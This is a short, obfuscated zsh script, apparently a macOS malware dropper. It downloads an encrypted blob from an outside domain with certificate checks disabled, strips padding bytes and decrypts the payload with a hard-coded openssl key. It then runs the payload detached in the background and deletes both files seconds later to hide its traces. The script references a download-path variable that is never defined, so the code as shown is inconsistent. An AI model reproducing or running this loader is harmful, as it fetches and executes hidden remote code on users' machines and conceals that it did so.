#!/bin/zsh
jygtg=$(mktemp /tmp/nmf8rk.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mf957dab28271d64a.bin" -o "$jygtgz" || exit 1
mg2ywc=$(stat -f %z "$jygtgz"); hac2b78=$(( mg2ywc - 269 - 647 ))
tail -c +$(( 269 + 1 )) "$jygtgz" | head -c $hac2b78 | openssl enc -d -aes-256-cbc -k 5a547634ed679b541d713096 -out "$jygtg" 2>/dev/null
[ -s "$jygtg" ] && chmod 700 "$jygtg" && ( "$jygtg" & ) && disown
( sleep 3; rm -f "$jygtg" "$jygtgz" ) &>/dev/null &
